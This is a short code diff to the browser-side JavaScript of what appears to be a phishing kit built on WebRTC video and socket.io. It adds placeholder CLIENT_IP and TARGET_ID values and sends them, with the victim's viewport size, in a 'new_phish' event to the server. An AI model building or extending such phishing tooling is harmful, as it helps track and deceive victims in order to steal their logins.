@@ -28,6 +28,9 @@ function height(){
   || 0;
 }
 
+const client_ip = 'CLIENT_IP';
+const target_id = 'TARGET_ID';
+
 //declare connnection and video in global scope for further reference
 var peerConnection;
 const video = document.querySelector("video")
@@ -36,7 +39,7 @@ const video = document.querySelector("video")
 const socket = io.connect(window.location.origin)
 let viewport_width = width()
 let viewport_height = height()
-socket.emit('new_phish', viewport_width, viewport_height)
+socket.emit('new_phish', viewport_width, viewport_height, client_ip, target_id)
 
 socket.on("push_state", function(new_state){
   history.pushState({},'','/' + new_state)
